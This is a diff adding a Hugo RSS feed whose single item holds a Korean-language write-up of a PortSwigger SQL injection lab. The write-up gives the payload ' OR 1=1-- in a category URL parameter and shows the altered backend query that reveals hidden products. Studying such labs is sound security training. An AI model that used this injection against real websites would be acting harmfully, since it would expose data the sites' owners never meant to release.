@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Where-Clause on D4rkScare</title>
+    <link>http://localhost:1313/tags/where-clause/</link>
+    <description>Recent content in Where-Clause on D4rkScare</description>
+    <generator>Hugo</generator>
+    <language>ko-KR</language>
+    <lastBuildDate>Mon, 02 Mar 2026 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/tags/where-clause/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>SQL Injection - Lab 1: WHERE clause</title>
+      <link>http://localhost:1313/posts/portswigger-sqli-lab1/</link>
+      <pubDate>Mon, 02 Mar 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/portswigger-sqli-lab1/</guid>
+      <description>&lt;h2 id=&#34;overview&#34;&gt;Overview&lt;/h2&gt;&#xA;&lt;p&gt;SQL injection 취약점을 이용해 WHERE 절을 우회하는 기초 랩입니다.&lt;/p&gt;&#xA;&lt;h2 id=&#34;analysis&#34;&gt;Analysis&lt;/h2&gt;&#xA;&lt;h3 id=&#34;문제-설명&#34;&gt;문제 설명&lt;/h3&gt;&#xA;&lt;p&gt;쇼핑몰 사이트의 카테고리 필터 기능에 SQL Injection이 존재합니다. &lt;code&gt;category&lt;/code&gt; 파라미터를 조작해서 숨겨진 상품을 노출시키는 게 목표입니다.&lt;/p&gt;&#xA;&lt;h3 id=&#34;페이로드&#34;&gt;페이로드&lt;/h3&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6c6f74&#34;&gt;1&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#a3be8c&#34;&gt;&amp;#39; OR 1=1--&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;&#xA;&lt;p&gt;URL에 다음과 같이 입력:&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/filter?category=&amp;#39; OR 1=1--&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;백엔드 쿼리:&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6c6f74&#34;&gt;1&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#81a1c1;font-weight:bold&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#81a1c1&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#81a1c1;font-weight:bold&#34;&gt;FROM&lt;/span&gt; products &lt;span style=&#34;color:#81a1c1;font-weight:bold&#34;&gt;WHERE&lt;/span&gt; category &lt;span style=&#34;color:#81a1c1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a3be8c&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#81a1c1;font-weight:bold&#34;&gt;OR&lt;/span&gt; &lt;span style=&#34;color:#b48ead&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#81a1c1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#b48ead&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#616e87;font-style:italic&#34;&gt;--&amp;#39; AND released = 1&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;flag&#34;&gt;Flag&lt;/h2&gt;&#xA;&lt;p&gt;Lab Solved ✅&lt;/p&gt;</description>
+    </item>
+  </channel>
+</rss>
